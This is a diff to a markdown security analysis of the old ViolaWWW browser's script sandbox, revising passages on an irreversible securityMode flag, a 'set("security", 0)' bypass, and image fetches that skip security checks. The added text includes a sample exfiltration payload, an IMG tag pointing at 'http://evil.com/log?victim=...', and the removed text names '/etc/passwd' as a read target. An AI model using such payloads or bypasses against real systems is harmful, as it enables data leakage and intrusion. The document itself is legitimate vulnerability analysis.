@@ -144,8 +144,10 @@ The loading process adjusts security:
 ```javascript
 securityMode(1);  // Make loaded objects untrusted
 send(objName, "init"); // Create objects
-// Note: securityMode(0) would NOT work here - once set to 1, it cannot be reset
+securityMode(0);  // Attempt to restore - but this does NOT work!
 ```
+
+**Note**: The original code calls `securityMode(0)` with the comment "back to normal", but this call has no effect. Once `securityMode` is set to a non-zero value, the condition `if (securityMode == 0)` in `meth_generic_securityMode()` prevents any further changes. This is a bug in the original ViolaWWW code — the security mode remains elevated for the rest of the session.
 
 ## Identified Vulnerabilities
 
@@ -176,7 +178,7 @@ long meth_cosmic_loadObjFile(VObj* self, Packet* result, int argc, Packet argv[]
 
 **Impact**: Untrusted objects can load arbitrary `.v` files containing malicious scripts.
 
-#### 3. Irreversible Security Mode (Correct Design, But Ineffective)
+### Design Note: Irreversible Security Mode
 
 Once `securityMode` becomes non-zero, it cannot be reset:
 
@@ -187,7 +189,7 @@ if (securityMode == 0)  // One-way door
 
 The author documented this as intentional: *"Can alter securityMode value only if mode == 0"*
 
-**This is actually correct security design** — preventing untrusted code from lowering security. However, it's rendered meaningless by the `set("security", 0)` bypass: an attacker doesn't need to change `securityMode` when they can directly set their object's `security` attribute to 0.
+**This is correct security design** — preventing untrusted code from lowering security. However, it's rendered meaningless by the `set("security", 0)` bypass described above: an attacker doesn't need to change `securityMode` when they can directly set their object's `security` attribute to 0.
 
 ### Attack Scenarios
 
@@ -591,7 +593,10 @@ ImgNode* imgNodeRefInc(char* id, char* filename) {
 
 When loading images (via `<IMG>` tag), the code calls `HTTPGet()` with `NULL` instead of `self`. This makes the check `if (self) if (notSecure(self))` always pass, **completely bypassing security** for all image fetches.
 
-**Impact**: Any `<IMG SRC="file:///etc/passwd">` would work regardless of security level.
+**Impact**: Any `<IMG SRC="file:///path/to/file">` triggers an unrestricted file fetch regardless of security level. While the fetched content must still pass through image decoding (so `file:///etc/passwd` would fail to render as an image), this bypass could be exploited with:
+- Valid image files from arbitrary local paths
+- Triggering side effects from the fetch itself (e.g., network requests to attacker-controlled servers via `<IMG SRC="http://evil.com/log?victim=...">`)
+- Potential information disclosure if image decoding errors reveal file existence or partial content
 
 ### Security Methods Documented as Non-Functional
 
